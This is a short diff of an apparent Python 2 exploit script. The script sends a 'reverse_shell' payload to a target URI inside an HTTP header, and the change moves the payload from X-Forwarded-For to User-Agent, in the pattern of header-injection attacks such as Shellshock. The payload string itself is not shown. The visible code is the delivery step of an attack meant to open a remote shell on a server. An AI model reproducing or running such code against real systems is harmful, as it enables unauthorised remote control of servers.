@@ -22,7 +22,7 @@ def main(args):
 	print "We will use the following shell: " + reverse_shell
 
 	headers = {"Content-type": "application/x-www-form-urlencoded",
-        "X-Forwarded-For":reverse_shell }
+        "User-Agent":reverse_shell }
 
 	conn.request("GET",args.uri,headers=headers)
 	res=conn.getresponse()
